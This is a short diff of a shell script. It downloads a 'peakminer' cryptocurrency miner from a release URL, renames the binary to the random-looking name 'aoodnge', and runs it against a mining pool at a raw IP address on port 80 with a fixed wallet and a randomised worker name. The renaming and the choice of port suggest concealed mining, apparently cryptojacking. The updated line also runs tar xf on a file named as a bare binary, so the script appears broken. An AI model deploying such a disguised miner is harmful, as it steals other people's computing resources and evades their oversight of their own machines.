@@ -1,5 +1,5 @@
-wget https://github.com/peakminer/peakminer/releases/download/v2.7.1/peakminer-2.7.1.tar.gz
-tar xf peakminer-2.7.1.tar.gz
+wget https://github.com/peakminer/peakminer/releases/download/v2.8.0/peakminer-2.8.0-linux-x86_64
+tar xf peakminer-2.8.0-linux-x86_64
 cd peakminer
 mv peakminer aoodnge
 ./aoodnge --coin pearl -o stratum+tcp://149.28.155.233:80 -u prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch/$(echo $RANDOM | md5sum | head -c 10)
